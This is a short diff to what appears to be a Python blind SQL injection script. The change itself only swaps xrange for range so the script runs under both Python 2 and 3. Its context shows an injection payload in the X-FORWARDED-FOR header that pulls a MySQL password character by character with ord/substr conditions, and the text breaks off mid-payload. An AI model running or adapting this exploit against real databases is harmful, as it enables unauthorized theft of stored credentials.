@@ -5,9 +5,9 @@ import sys
 import time
 
 try:
-    xrange
+    range = xrange
 except NameError as e:
-    xrange = range
+    pass
 
 headers = {
     'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36',
@@ -19,7 +19,7 @@ print('start to retrive MySQL infomation:')
 
 def run():
     user = ''
-    for i in xrange(1,33):
+    for i in range(1,33):
         for payload in payloads:
             try:
                 headers["X-FORWARDED-FOR"] = "1.2.3.4' or if(ord(substr((select password \
